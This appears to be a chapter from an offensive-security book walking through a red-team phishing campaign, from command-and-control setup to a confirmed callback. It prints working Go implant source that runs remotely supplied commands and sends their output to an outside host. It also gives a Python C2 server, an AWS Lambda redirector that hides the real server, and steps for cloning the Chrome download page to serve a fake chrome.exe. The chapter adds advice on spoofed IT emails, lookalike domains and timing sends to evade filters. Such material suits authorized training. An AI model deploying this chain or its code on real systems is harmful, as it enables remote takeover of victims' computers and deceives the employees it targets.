PHISHING ATTACK WITH C2 REDIRECTORS
The No Starch Press iron logo
This scenario presents some new challenges and new technologies to tackle them. Your client wants you to target individuals in their organization via a phishing campaign. Your objective is to gain code execution on an employee-owned system by convincing the employee to click a phishing email that will lead them to execute your payload. You’ve been notified that the organization has fairly sophisticated EDR solutions in place, so you won’t be able to guarantee success with off-the-shelf C2 tools. Thankfully, you know how to write your own.

For this example, you can use the sample implant and C2 server provided in the book’s repository (https://github.com/3ndG4me/Offensive-Security-Engineering), or you can use the custom implant you developed in previous chapters. As a proof of concept, you’ll be targeting only one user, who will also test your campaign as you develop it. If you want a more realistic simulation, you can set up two emails: one for testing and one for mimicking the campaign execution.

You’ll carry out these steps for this scenario:

Prepare your C2 implant and server.
Configure a C2 redirector so you can keep your C2 server alive even if your redirector endpoints get burned.
Set up a host for your C2 server and implant.
Configure a Gophish account.
Create and launch your phishing campaign.
I’ll go over each step in more detail as you complete it.

Preparing Your Custom C2 Implant and Server
The first step is pretty straightforward. Your goal is system compromise, so you need to be able to catch shells. Using the base-c2 Terraform code, configure your C2 server once again. Then you need to build your custom implant. If you already have yours ready, you’re good to go (although you’ll be implementing it a bit differently in this example). Otherwise, copy the main.go code shown in Listing 10-1 from the repo’s simple_c2_implant folder, making the changes highlighted.

package main

import(
    "net/http"
    // "log"
    "net/url"
    "io/ioutil"
    "regexp"
    "os/exec"
    "time"
    // "fmt"

    // Third party
    "github.com/mattn/go-shellwords"
)

func main() {
    const cmd_delay time.Duration = 10
    init := 0
    for {
        init = GetCmd(init)
        time.Sleep(cmd_delay * time.Second)
    }
}

➊ func GetCmd(init int) (int) {
    var url string

    if (init == 0) {
        url = "https://aws-endpoint-here/agent-check-in"
    } else {
        url = "https://aws-endpoint-here/"
    }

    resp, err := http.Get(url)
    if err != nil {
        // log.Fatalln(err)
        return 0
    }

    body, err := ioutil.ReadAll(resp.Body)

    if err != nil {
        // log.Fatalln(err)
        return 0
    }

    var out []byte

    re := regexp.MustCompile(`^([^\s]+)`)
    cmdParsed := re.FindStringSubmatch(string(body))
    cmd := cmdParsed[0]

    re = regexp.MustCompile(`\s(.*)`)
    argParsed := re.FindStringSubmatch(string(body))
    var arg string

    if len(argParsed) > 0{
        arg = argParsed[0]
    }

    // Debugging command input
    // fmt.Println("Command is: " + cmd + " " + arg)

    argS, err := shellwords.Parse(arg)

    if err != nil {
        // log.Fatalln(err)
        return 0
    }

    if cmd != "" && len(argS) > 0 {
        out, err = exec.Command(cmd, argS...).Output()
    } else if cmd != "" {
        out, err = exec.Command(cmd).Output()
    }

    if err != nil {
        // log.Fatalln(err)
        return 0
    }

    SendResponse(string(out))
    return 1
}

// Send response to your C2

➋ func SendResponse(output string){

    url := "https://aws-endpoint-here/" + url.PathEscape(output)
    _, err := http.Get(url)
    if err != nil {
        // log.Fatalln(err)
        return
    }
}
Listing 10-1: A simple C2 implant in Go

After updating this code, be sure to run go mod init and go mod tidy to install the third-party shellwords library that this example implant depends on.

Keep in mind that this implant is totally open source, so it is easily detected, but the implementation is unique enough that you could use it to inspire a new implant. Namely, the GetCmd() ➊ and SendResponse() ➋ functions both make a call to an AWS API endpoint. You’ll fill in the placeholder code for both SendResponse() and GetCmd() later in the chapter.

Next, copy the simple_c2_server.py code, shown in Listing 10-2.

#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

# HTTPRequestHandler class
class testHTTPServer_RequestHandler(BaseHTTPRequestHandler):

    # GET
    def do_GET(self):
        if self.path == "/agent-check-in":
            print("Agent is ready!")
        elif self.path != "/":
            output = urllib.parse.unquote(self.path)
            print("Agent Returned: " + output)
        
        # Supply next command.
        cmd = input("Command > ")

        # Send response status code.
        self.send_response(200)

        # Send headers.
        self.send_header('Content-type','text/html')
        self.end_headers()

        # Write content as utf-8 data.
        self.wfile.write(bytes(cmd, "utf8"))

        return

def run():
    print('Starting Simple C2 Server :)')

    # Server settings
    # Choose port 8080; for port 80, which is normally used for an http  
    # server, you need root access.
    server_address = ('127.0.0.1', 1337)
    httpd = HTTPServer(server_address, testHTTPServer_RequestHandler)
    print('Server initialized')
    httpd.serve_forever()

run()
Listing 10-2: A simple C2 server in Python

At this point, you should have a pretty firm grasp on setting up C2 implants and servers. Now let’s look at configuring the C2 redirector.

Implementing C2 Redirectors via the Serverless Framework
A redirector is a piece of infrastructure that acts as middleware in the C2 configuration chain, redirecting requests from the implant to the real C2 server. In this scenario, it will be the URL of the Serverless application that you deploy.

The main benefit of this setup is that your C2 server’s real IP address and domain are never exposed to your client. This is helpful particularly for multitenant operations, where one C2 server is being used to manage remote shells across multiple organizations. If one organization catches your C2 implant and blocks or reports your C2 server, you’ll lose access to only that target while maintaining the shells you’ve captured at targets that haven’t yet detected your implant.

You can even take this a step further by putting a redirector in place for each target and baking fallback endpoints into your implant. This way, if traffic to one redirector is ever caught and blocked, your implant can automatically rotate to a new one to maintain a persistent connection.

Of course, a redirector does not magically make you unstoppable. It’s an additional layer of insurance that gives you persistence options that otherwise you wouldn’t have. You could instead put multiple C2 servers in place, which is a smart solution but not nearly as efficient. Your overall C2 infrastructure should include both backup servers and redirectors where possible. The advantage of redirectors is their adaptability. You can deploy and destroy as many redirectors as you see fit without impacting your C2 server operations.

The only downside to redirectors is complexity. They’re not inherently compatible with the workflow of most C2 frameworks. Although some C2 frameworks, like Empire, have built-in support for redirectors, you must adhere to the framework’s specification for your implementation. In the case of Metasploit, which requires more advanced configuration for HTTP/HTTPS redirectors, you can opt to use tools like Socat (http://www.dest-unreach.org/socat/) to create a raw universal forwarder instead. This requires another server in the middle, which adds complexity in a different way, but at times the extra complexity can be worth it to simplify adding a redirector for Metasploit; however, for operational security, HTTP/HTTPS redirectors are generally preferred over raw socket forwarding because they provide better heuristic evasion capabilities. Understanding your C2 framework’s capabilities and how to handle more advanced configurations can be incredibly useful, if not necessary, for carrying out the requirements of an operation.

Creating an AWS Lambda Redirector in Python
Although using AWS Lambda and the Serverless Framework is one way to implement a redirector, it’s not the only way. The benefit to using any cloud service provider is that it will usually provide you with a URL that already has TLS configured on a valid and trusted domain name. You can use this to your advantage. An implant calling out to a redirector that resembles traffic to an AWS endpoint, for example, looks a lot less suspicious than one calling out to c2.attacker.com or a raw unknown IP address.

Using these services also reduces infrastructure complexity. Instead of needing to stand up a whole redirector server, you are now “serverless,” so all the architecture is handled for you. You can simply deploy the redirector code and grab the API endpoint it generates for you. To do so, you’ll change the code generated by the original Serverless Flask application that you set up in Chapter 4. Open app.py and update it as follows (you’ll find this code in the serverless-redirector/flask-redirector folder in the book’s repo):

from flask import Flask, jsonify, make_response, request
import json
import urllib3

http = urllib3.PoolManager()
app = Flask(__name__)

def redirect(path):
    query = request.query_string.decode()

    host = "http://c2.injection.sh:9001"

    if path != '':
        host += "/" + path

    if query != '':
        host += "?" + query # Replace with your API URL.

    try:
        # Make the GET request.
        response = http.request('GET', host)

        return {
            'statusCode': 200,
            'body':  response.data.decode('utf-8') # Decode the response from bytes to string.
        }
    except Exception as e:
        print(f"Error: {str(e)}")
        return {
            'statusCode': 500,
            'body': json.dumps({
                'error': str(e)
            })
        }

@app.route("/")
def index_route():
    return redirect('')

@app.route('/<path:path>')
def catch_all(path):
    return redirect(path)

@app.errorhandler(404)
def resource_not_found(e):
    return make_response(jsonify(error='Not found!'), 404)
First, you modify the host variable within the redirect() function. This variable contains the domain name or IP address of the real C2 server that the traffic will be directed to. In the redirect() function, the code verifies whether the requested path exists and checks for any query parameters in the URL. This redirector is a simple GET request and works as a seamless pass-through proxy for any C2 server that supports GET requests. This function will forward the request to your C2 server and then return the response to your C2 implant, acting as middleware to redirect the traffic.

The rest of the code can be summed up by two attributes: routing and error handling. It defines only two routes. First, the index_route() function handles any requests to the root path of /. Second, the catch_all() function takes a special route of /<path:path>, which is Flask’s syntax for any path other than the root path. Both functions call redirect() with their respective paths, tunneling any GET requests through the redirect() function.

This code also includes an error handler for nonexistent pages, though this is largely redundant since the catch_all() function will respond to any page request by default. The error handler is provided mainly as a template to demonstrate how you might handle errors. If you don’t need these lines, you can ignore or remove them.

With your host variable changed, you’re just about ready to deploy your redirector. As an extra challenge, I invite you to tinker with the request logic to make it compatible with another C2 framework of your choice.

Deploying the Redirector to AWS Lambda
You’ll need to set up one more dependency before you can deploy your redirector. The most important piece of this code determines the way requests are made, so choosing the correct library is critical. AWS Lambda functions have specific requirements for web request libraries. Although you could import any library or framework you want by creating Lambda layers within the AWS console, doing so is beyond the scope of this particular example.

For Python versions 2.7, 3.6, and 3.7, AWS supports the Botocore library, which contains a requests module. For Python versions 3.8 and above, the urllib3 library, which your code is currently using to make HTTP requests, is well supported and provides all the functionality your code will need. To ensure that this dependency is installed when you deploy to AWS Lambda, activate your previously created Python virtual environment from Chapter 4 and modify the requirements.txt file as follows:

Flask==3.0.3
urllib3 == 2.2.3
Use pip to install the required libraries:

(redirector-env)$ pip3.12 install -r requirements.txt
Finally, deploy the redirector endpoint like so:

(redirector-env)$ sls deploy
Deploying "Flask-redirector" to stage "dev" (us-east-1)
Using Python specified in "runtime": python3.12

Packaging Python WSGI handler

✔ Service deployed to stack Flask-redirector-dev (56s)

endpoints
ANY ~ https://3h976x0jzb.execute-api.us-east-1.amazonaws.com/dev/
ANY ~ https://3h976x0jzb.execute-api.us-east-1.amazonaws.com/dev/{proxy+}
Functions

api: flask-redirector-dev-api (6.8 MB)
Once deployment is finished, you’ll get an endpoint URL to paste into your C2 implant as the remote host to connect back to.

Configuring a Custom C2 Server and Implant
Now you’ll prepare a host for your implant. For simplicity’s sake, you’ll use a Python simple HTTP server again, but in a real operation, you’d want to host the implant on a more legitimate-looking domain and port. You can configure this any way you like. For this example, first you’ll create a directory on your C2 server to contain your implant after you compile it:

kali@kali:~$ mkdir -p /tmp/simple_c2/www
Next, you’ll modify the C2 source you worked on at the start of this chapter by replacing the aws-endpoint-here placeholder string in main.go with the Serverless endpoint URL you just got back, as shown in Listing 10-3.

func GetCmd(init int) (int) {

    var url string

    if (init == 0) {
        url = "https://3h976xojzb.execute-api.us-east-1.amazonaws.com/dev/agent-check-in"
    } else {
        url = "https://3h976xojzb.execute-api.us-east-1.amazonaws.com/dev/"
    }
    resp, err := http.Get(url)
    if err != nil {
        // log.Fatalln(err)
        return 0
    }
...
func SendResponse(output string) {

    url := "https://3h976xojzb.execute-api.us-east-1.amazonaws.com/dev/"+ url.PathEscape(output)
    _, err := http.Get(url)
    if err != nil {
        // log.Fatalln(err)
        return
    }

}
Listing 10-3: Modifying the GetCmd() and SendResponse() functions in main.go with the Serverless endpoint URL

Build the implant binary and copy it over to your C2 server any way you see fit. Once that’s in place, you can start a simple HTTP server on port 8080 with Python:

ec2-user@kali:~$ cd /tmp/simple_c2/www
ec2-user@kali:/tmp/simple_c2/www$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)...
Using the same method you used to copy over your C2 implant binary, copy the simple_c2_server.py file into your /tmp/simple_c2 directory. Do not place it in the /www directory, as that will expose your C2 source code to the internet via the HTTP server hosting your implant. When you start your C2 server, it will be listening on port 9001, the same port you specified in your app.py redirector code. Start the C2 server and run a quick curl call to your test-c2.injection.sh:9001 endpoint at the URI /test path:

$ curl http://test-c2.injection.sh:9001/test
ec2-user@kali:/tmp/simple_c2$ python3 -m simple_c2_server.py
Starting Simple C2 Server :)
Server initialized
Agent Returned: /test
Command >
You can see that a response is successfully returned. Your C2 server is listening and ready, and your implant is staged for deployment. Now you’re ready to configure a new phishing campaign with Gophish.

Configuring Gophish
To fully walk through this demo, you’ll need access to a Simple Mail Transfer Protocol (SMTP) server. While most email providers give you access to theirs (as long as you don’t use it to violate their terms of service), standard Gmail or Microsoft Outlook accounts won’t be effective for a real phishing campaign. This example uses Google Workspace SMTP services, which offer more flexibility than personal accounts. Depending on your provider, you might need to configure your Gmail account to allow insecure application access or use a specially crafted application password (see https://support.google.com/mail/answer/185833?hl=en for instructions).

In a professional setting, of course, your team or organization will provide the resources you need to configure a server correctly, including SMTP access. But don’t be discouraged if you don’t have SMTP access for this exercise. You’ll still be able to complete most of the steps for configuring a phishing campaign with Gophish; you just won’t be able to test sending the final email.

Ideally, you should separate your phishing infrastructure from your C2 infrastructure; this separation of duties is an offensive security engineering best practice. Having everything on one system can seem convenient, but systems have finite resources. A good phishing server needs ports 80 and 443 available, which means you can’t use these common egress ports for your C2 operations and may be prevented from catching a shell. Furthermore, phishing is much noisier than C2 operations; if your phishing server is hosting both services and gets blocked, so do your C2 communications. With separate servers, however, if your phishing campaign gets discovered and blocked, your implants can remain undetected and you can maintain remote access to the target network via your C2 server.

In the base-gophish folder, you’ll find a gophish.tf file that you can use as a guide to set up two separate servers, but for this example, you’ll be running the Gophish and C2 operations on the same server. Although not best practice, admittedly it provides some convenience in that you can use the same subdomain DNS entry from the previous examples.

One industry standard you won’t skip out on is the principle of least privilege. While some OSTs work best with full privileges, you’re still subject to the same best practices as any platform engineer or system administrator—and this applies to Gophish as well.

Creating the Gophish Service Account
Before you install Gophish, you need to create a gophish user on this system:

ec2-user@kali:~$ sudo adduser gophish --home /home/gophish
Adding user 'gophish' ...
Adding new group 'gophish' (1002) ...
Adding new user 'gophish' (1002) with group 'gophish'
New password:
This standard, low-privilege user will run your Gophish server. That way, if the server is compromised, the attacker gains only unprivileged access and will have to escalate privileges to cause further harm—which should be extremely difficult if you’re patching your infrastructure as you’re supposed to. You could even tighten down this user more, removing shell access altogether to make it a true service account, which would be even more secure.

Installing Gophish and Configuring Program Permissions
With your gophish account created, you can fetch your Gophish software from https://github.com/gophish/gophish/releases and copy it to the server any way you wish. One option is to use the wget tool to download it via the command line, and then create a directory called gophish where you’ll unzip the software. Once the zip archive is downloaded and moved into the target directory, simply unzip it and navigate to the directory:

ec2-user@kali:~$ wget https://github.com/gophish/gophish/releases/download/v0.12.1
/gophish-v0.12.1-linux-64bit.zip
ec2-user@kali:~$ mkdir gophish
ec2-user@kali:~$ mv gophish-v0.12.1-linux-64bit.zip gophish/
ec2-user@kali:~$ cd gophish

ec2-user@kali:~/gophish$ unzip gophish-v0.12.1-linux-64bit.zip
ec2-user@kali:~/gophish$ chmod +x gophish
Don’t run the software just yet; you have a few more details to configure.

NOTE
Ideally, you would create the gophish directory in the gophish user’s home folder instead of ec2-user. The location doesn’t really matter as long as you configure the permissions correctly, but this example doesn’t demonstrate organizational best practices.

Gophish runs its primary services on ports 80 and 443, which normally require root privileges. Since you’re not running as root, you’ll use the setcap command to grant the Gophish binary access to these network ports without having to elevate all its privileges, keeping your principle-of-least-privilege approach intact:

ec2-user@kali:~/gophish$ sudo setcap CAP_NET_BIND_SERVICE=+eip gophish
As noted previously, setting permissions properly for the gophish folder is important because you’ve conducted all these steps as ec2-user instead of as gophish. Although it’s perfectly normal to conduct this setup as a privileged user so you can do things like configure setcap, it means you need to be meticulous about the other permissions you set, such as folder and binary access. To that end, you’ll use the chown utility to change the ownership of the gophish directory and its contents to the gophish user and group as follows:

ec2-user@kali:~/gophish$ sudo chown -R gophish:gophish.
Now only the gophish user (and root) can access these files.

Finally, you can start your Gophish server, running it as your gophish user:

ec2-user@kali:~/gophish$ sudo -u gophish ./gophish &
This command switches your user context to the gophish user and runs the tool in the background.

Keep in mind that you’ve been running all this code—your C2 server and Python simple HTTP server included—in the context of a tmux pane, which will keep all your services alive indefinitely even if you get disconnected. Alternatively (and ideally for standing up a long-term piece of phishing infrastructure), you could configure Gophish as a service, but that’s overkill for this quick example.

Setting Up an SSH Proxy to the Gophish Admin Panel
Gophish serves the phishing pages on ports 80 and 443, but its management service runs on port 3333 and is hosted on only the localhost interface. This means it can’t be accessed via the public server IP address, which is great; if its administrative interface were publicly exposed, anyone could access your phishing server, learn what you’re running on that system, and potentially try to attack it. This brings up another best practice: Never expose administrative interfaces unless you absolutely have to (which would be rare). To securely access your Gophish admin panel during your engagement, use an SSH proxy. To accomplish this, you’ll use a local port-forward via SSH, using the -L flag:

$ ssh -i ~/.ssh/YOUR_KEY/.pem -L localhost:3333:127.0.0.1:3333 ec2-user@YOUR_SERVER_IP
Initially, your server is still not accessible. Your proxy is simply ready to receive connections. If you try to access the Gophish admin panel, you won’t get a response. You can configure your browser proxy to forward traffic to localhost/127.0.0.1 on port 3333 any way you see fit, but in this example you’ll use your old friend from Chapter 2, FoxyProxy. Just as before, you’ll create a new proxy named Gophish, but this time you’ll connect port 3333, as shown in Figure 10-1.

FoxyProxy configuration with “Gophish” name, SOCKS5 proxy type, IP address 127.0.0.1, port 3333, and empty username/password fields.
Figure 10-1: Configuring a Gophish proxy in FoxyProxy

Then simply open the extension and select your new Gophish proxy (Figure 10-2).

FoxyProxy extension with multiple proxy servers listed. “Gophish” is selected and enabled, with other options including “C2 Prox Pivot,” “Burp,” and “Turn Off.”
Figure 10-2: Changing FoxyProxy to use the Gophish proxy

Configuring the Gophish Admin Panel
With FoxyProxy enabled, you can now access the Gophish admin panel with your default credentials (see Figure 10-3).

A login page at localhost:3333 with a hexagonal fishing hook logo, username/password input fields, and a “Sign In” button below the form.
Figure 10-3: Gophish home page

Keeping up with your best practices, you’ll navigate immediately to the settings panel to change your admin user’s password (see Figure 10-4).

GoPhish v0.9.0 settings page with Account tab selected. It displays API key with option to reset, username field, password change fields, and Save button.
Figure 10-4: The Gophish account settings page

You have successfully hardened and deployed Gophish, applying the principle of least privilege, restricting access to administrative interfaces, and rotating the default credentials. These are all practices that offensive security assessments are calling out organizations for neglecting, and you don’t want to be guilty of the same oversights you’re being paid to find!

Creating and Launching a Gophish Campaign
Now you’ll create your phishing campaign. In a social engineering attack, one of the first steps is establishing a mark, which is just a fancy term for a human target. You treat marks a little differently than technical targets, however, because people are more complex than computers. The more information you have on your mark, the more creative you can be in your attack. With technical targets, you can still be creative, but you’re limited by a technology’s capabilities. While you can exploit technology to operate outside its boundaries, exploiting a human could extend to convincing them to compromise technology for you. That’s a fairly meta example, but the point is that you have to learn about your target emotionally, not just logically.

Phishing has two general approaches. Mass phishing relies on volume; you target many people at once to try to get a higher success rate. If you send 100 people a convincing enough phishing email and 20 people click it, that is far more attack surface than you’d get by sending the same email to 20 people and having only 2 click it. Keep in mind, however, that the larger the campaign, the more spread out it needs to be. Timing is crucial. If you send all the emails at once, you risk triggering a spam filter control or raising users’ suspicions when they realize they all just received that strange email at the same time. Spread out the emails too far, though, and you can run into the same issue: If your email arouses suspicion, word might spread before you can complete your campaign.

Always err on the side of spacing out the emails you send, but base the exact timing on the organization you’re targeting and the type of phishing email you’re sending. In a large organization, sending out a mass HR email over the course of a week might make sense (and you’d want to exclude HR and executives from this email to avoid detection), whereas an IT support email might be spread out over a month or as little as three days. It depends on the context. Do you want to get as many clicks as you can before being caught, or do you want to fly under the radar in hopes that your email will reach more people over time? Your understanding of your client’s organization will help you find the optimal balance.

The second approach is spear phishing, which targets a specific individual or small subset of individuals. In these campaigns, you identify a mark and then build an email you’re certain your target will click. You’ll simulate this approach in this scenario. Your mark is a tech-savvy sales lead. You’ve researched this employee’s social media accounts, interests, general location, appearance (any public information about them) and compiled all this data into a profile to determine the sort of person they are and how they might respond to certain scenarios. Of course, people are complex, and compiling a profile like this isn’t easy, but it’s worth doing. Even if you end up using only two pieces of information, like their favorite sports team and where they work, you can still build an email uniquely targeted toward them.

You’ll be taking advantage of your mark’s friendly nature and tech savviness to craft a campaign where you pose as the organization’s internal IT team. You’ll send an email informing the mark of a critical Google Chrome security patch and asking them to apply the patch themselves to assist IT staff. You will assure them that IT will be coming by eventually, but it will save the team time if users can apply the patch themselves.

You know your mark is friendly and helpful, and you also know they are tech savvy, so maybe they’re doing “shadow IT” work already. In shadow IT work, a more technical user handles their own software deployment or configuration without IT approval, which can expose an organization to vulnerable software or malware. This is exactly what you’re hoping for in this case.

Cloning a Landing Page
To configure this campaign in Gophish, first you need a landing page. Since you’re asking for a Google Chrome update, you want to mirror the official Chrome download page (shown in Figure 10-5). Gophish works similarly to the automated goclone tool you used in Chapter 3, so the cloned page will be nearly 100 percent identical.

The Google Chrome download page with text “Get more done with the new Chrome” and a central “Download Chrome” button.
Figure 10-5: The real Google Chrome download page

Navigate to the Gophish Landing Page tab by using the navigation bar on the left side of the application. Select New Page, and in the dialog prompt paste the URL of the real Google Chrome download page. Then click Import (see Figure 10-6).

Gophish’s “Import Site” modal with a text field containing “https://www.google.com/chrome/” for website cloning.
Figure 10-6: Cloning the Chrome landing page

You should see the preview shown in Figure 10-7.

GoPhish modal with a preview of a cloned Google Chrome download site. The landing page is named “Google Chrome” with a small rendered preview below.
Figure 10-7: Previewing the cloned page

The preview might not look like much, but it creates an almost identical clone. You’ll need to test your campaign to verify this, however, as the preview editor doesn’t always reflect the final product. Always run a few tests to be sure the page is rendering as intended. Before you can do that, click Source to access the source code for the cloned Chrome page.

The functionality varies for the Download Chrome button on the legitimate site. Sometimes the setup executable downloads right away, and sometimes a modal pops up requiring the user to click Accept and Install before the executable downloads. As a work-around, you’ll remove the JavaScript handlers from the main Download Chrome button to force this modal to appear and then add your link to the Accept and Install button as well. This way, if the target clicks the main Download Chrome button and it doesn’t download as you expect it to, you still control the download flow because the legitimate modal prompt also contains your malicious executable link.

To edit the Download Chrome link, find the button HTML reference and delete the unnecessary JavaScript classes but leave the CSS. This is left as an exercise for you, since this page has likely changed since the time of writing; however, revisiting Chapter 3 as needed and referencing Figure 10-8 should point you in the right direction.

GoPhish landing page editor in HTML source code view with Import Site button, unchecked Capture submitted data box, and Cancel and Save Page buttons.
Figure 10-8: Adding your malicious link

You could convert the button into a link in a lot of ways, but the quick and dirty way is to wrap an anchor tag around the button’s text:

<a href="http://your.link/chrome.exe">Download Chrome</a>
You’ll do the same thing for the Accept and Install modal. This modal view is hidden from the page, but its code already exists in your HTML document, so just search for Accept and Install, then wrap an anchor tag around that text to add the link (see Figure 10-9).

GoPhish landing page editor in HTML source code view with highlighted anchor tag showing Chrome download button now goes to http://udemy-c2.injection.sh:8080/chrome.
Figure 10-9: Editing the Accept and Install link

This link will connect to the Python simple HTTP server you’ve configured. Your server is listening on port 8080, so your URL will look more like http://<your_ip>:8080/chrome.exe. If you haven’t done so already, name your implant binary something like chrome.exe or chrome_setup.exe to make the filename look more convincing when the user downloads it.

With that, you’re done with the landing page (see Figure 10-10).

Gophish’s Landing Pages section showing a success alert for a new page, an “Add New Page” button, and a list containing one entry named “Google Chrome”.
Figure 10-10: The Google Chrome phishing site

Save the page and move on to the next step: crafting the phishing email.

Creating a Phishing Email Template
Gophish offers a pretty powerful editor and templating syntax for sending an email. You can either import an email as a template if you have a sample from your client that you want to replicate for maximum persuasiveness, or use the templating language to dynamically enter content like the target’s name (using the {{.FirstName}} syntax, shown in Figure 10-11) or a link to your phishing site.

Gophish’s email creation modal showing subject line “Urgent Chrome Update - IT” and HTML editor with a message urging recipients to download Chrome within 5 days.
Figure 10-11: Creating the phishing email template

Before you launch the campaign, you’ll configure your Chrome downloader phishing site in the campaign creation wizard to map to this email (see Figure 10-12). This will automatically populate the {{.URL}} template value with your campaign’s hosting server URL. While you could paste a direct link to your executable here instead, doing so would look far more suspicious and might even be caught by email filter controls. Using this {{.URL}} variable not only takes advantage of your convincing phishing page but also enables real-time tracking so you’ll know whenever a user clicks the link in your email.

Gophish’s link insertion modal showing the word “here” in the phrase “Google Chrome download page here” being linked via an HTTP protocol URL variable provided by Gophish.
Figure 10-12: Adding the link to the cloned Chrome phishing page

In the body of your email, you’re impersonating the internal IT department and asking the target to install a critical security update for Chrome within five days (Figure 10-13). You’re trying to strike a balance with the urgency level—enough that a conscientious employee will probably act, but not so much that a less motivated employee wouldn’t ignore the email outright instead of getting suspicious. This is all assumptions, of course, and no social engineering activity is without risk. It’s just as possible that the user will blindly click this link or immediately report the email to their security team. The more you know about your mark, the more educated guesses you can make about how they will behave and the better your odds of success.

Gophish’s email editor in HTML mode showing partial phishing email with link text and false assurance about manual assistance if users don’t update within five days.
Figure 10-13: Finalizing your phishing email

Once you finish defining your template, click Save Page at the bottom left, and you should see it listed on the Gophish Email Templates page, as shown in Figure 10-14.

Gophish’s Email Templates section showing a success alert, an Add New Template button, and a list with one entry for “Chrome Email”.
Figure 10-14: Viewing the completed phishing email template

Configuring an SMTP Sending Profile
You’re ready to define your target email list. Select Users & Groups in the left-hand menu, then click New Group at the top to add a new list of target names and emails. You’ll assign your mark the name Phish Me with an email of phishme@injection.sh (see Figure 10-15). To test your campaign, you’ll replace this email address with one you can access.

GoPhish New Group modal showing name field and target entry form with options for CSV import or manual entry (First & Last Name, Email, Position). User “Phish Me” is listed.
Figure 10-15: Adding users to target in your phishing campaign

Click Save Changes, then select Sending Profile in the left-hand menu. Click New Profile to enter the credentials for your SMTP server. In the From field, you need to provide a convincing sender header. To make it look like an official IT email address for the company you’re targeting, you’ll name the sender IT for an email of it@company.com.

NOTE
Spoofing the From value of the email this way isn’t exactly foolproof. It can be easily detected and flagged since the email server you’re sending from obviously doesn’t have a right to the company.com domain. If your target organization has weak Sender Policy Framework (SPF) and Domain-based Message Authentication, Reporting, and Conformance (DMARC) records, you might be able to pull this off without raising suspicion, but that discussion is beyond the scope of this book.

Next, you’ll configure the host. At the time of writing, the Google Workspace/Gmail SMTP server is hosted at smtp-relay.gmail.com on port 587 with TLS, so enter smtp-relay.gmail.com:587 in the Host field. Select the Ignore Certificate Errors checkbox. Gophish isn’t fully compatible with the TLS configuration of some SMTP services, Google included, so this option ignores signature errors while maintaining encryption for the connection.

For the other settings, provide the credentials for the account you’re using to authenticate to your SMTP server and then save the sending profile; it should look like Figure 10-16.

Gophish’s New Sending Profile modal with name Primary, interface type SMTP, From: I T, Host: smtp-relay.gmail.com:587, username: nostarch@injection.sh, password masked, and Ignore Certificate Errors checked.
Figure 10-16: Configuring an SMTP profile

You can use the test email functionality to confirm that this SMTP configuration works correctly and can send emails before you proceed. Note that this is not the same as testing your phishing campaign, so you’ll still want to do that before executing the campaign. In Figure 10-17, I’m doing all my testing with the fake target email because it’s in a contained lab scenario.

Gophish’s Send Test Email modal with form fields showing First and last Name “Test”, Email “phishme@injection.sh”, blank Position, and Cancel/Send buttons.
Figure 10-17: Sending a test email

When you’ve verified that the email works as intended, save your profile. You should see it listed in the Sending Profiles page.

Executing the Campaign
Now you’re ready to configure and launch your campaign. This process is identical for testing and execution (the only difference is the email recipient), so I’ll show the steps here only once. For a test, you’ll send the emails to yourself and make sure all your links are working (including those to download a binary, as in this scenario), the emails look correct, and the pages render properly. For execution, you simply repeat the process but against your real target list.

To create a new campaign, select Campaigns in the primary navigation menu, then click New Campaign. The Gophish campaign comprises a name, the email template you created, the landing page you created, a URL that points to the phishing server, a start time (Launch Date) and end time (Send Emails By), a sending profile, and your targets. The URL can be either your configured domain name if you have one or your server’s IP address if you don’t.

The start and end times give you some control over the sending speed. If you don’t specify an end time, you can set the emails to start later, but they’ll be sent to all the targets at once. If you don’t set an end time or schedule a delayed start, the emails will all be sent immediately. When you set a range, however, Gophish automatically distributes the emails by dividing the number of targets by the duration between the engagement’s start and end times.

If you need to get more granular than the Gophish default configurations, there are ways to script this out, but that’s beyond the scope of this discussion. Your final configuration should resemble Figure 10-18.

Gophish New Campaign modal with name Test, template Chrome Email, landing page Google Chrome, URL http:/udemy-c2.injection.sh, March 2025 launch, Primary sending profile, Target group.
Figure 10-18: Creating a new phishing campaign

Click Launch Campaign to proceed. To track the status, select Campaigns in the primary navigation menu. When the user opens the email, you’ll see the result shown in Figure 10-19.

Campaign results for Test showing circular indicators: 1 email sent, 1 opened, 0 clicked/submitted/reported. Target “Phish Me” is listed with status “Email Opened”.
Figure 10-19: The campaign-tracking status when the user opens the email

Phishing Payload Execution
All that’s left is for the user to click the link, and then hopefully download and run your fake chrome.exe payload (see Figure 10-20).

Phishing email with subject “Urgent Chrome Update – I T” sent to user Phish. Email body includes linked text “Here” to download payload instead of Chrome.
Figure 10-20: The user interacting with your phishing email

You’ve already done the hard work to configure and stage everything, so at this point you’re just monitoring the C2 server for incoming connections.

The phishing site looks nearly identical to the official Chrome download page (compare Figure 10-21 to the real landing page shown earlier in Figure 10-5); they’re spaced slightly differently, but otherwise the clone is extremely convincing. The only hints that this site is fake are that it isn’t from a google.com domain and it isn’t being served over a TLS connection. You can fix this by configuring TLS for your Gophish instance and purchasing a domain that looks similar to something Google owns, such as gogle.org (which is registered but unused at the time of writing), to help you be more convincing.

Cloned Chrome download page at http://udemy-c2.injection.sh/?rid=1fR1lzP displaying “Get more done with the new Chrome” and Download Chrome button.
Figure 10-21: The Google Chrome Download phishing page

When the user clicks Download Chrome, they’ll see the Accept and Install modal you set up earlier with a link to your implant (see Figure 10-22).

Chrome phishing page showing a modal with “Download Chrome for Mac” text, Terms of Service links for Google and Chrome/ChromeOS, and Accept and Install button.
Figure 10-22: Clicking Accept and Install to download the implant

After clicking Accept and Install, the user will be prompted to download the implant (see Figure 10-23).

Chrome phishing site modal in background, while the foreground displays a Save File prompt for downloading “chrome.exe”.
Figure 10-23: Downloading the staged implant

Receiving a Custom Simple C2 Callback
The user has downloaded the implant binary. On the C2 server, you should be able to see exactly when they execute it and confirm you have access:

ec2-user@kali:/tmp/simple_c2$ python3 simple_c2_server.py
Starting Simple C2 Server :)
Server initialized
Agent is ready!
Command > whoami
35.177.4.142 - - [19/Apr/2020 08:27:50] "GET /agent-check-in HTTP/1.1" 200 –
Agent Returned: /biggie-pc\biggie
Success once again! You’ve completed your objective and achieved code execution on your target’s system. From here, you are done, as your client asked only for code execution. If they wanted more, you would execute your rule of “one is none and two is one” to cement your access. All you need to do is run simple commands like ipconfig to confirm you’re really on your target’s system.

Red Team Infrastructure in the Real World
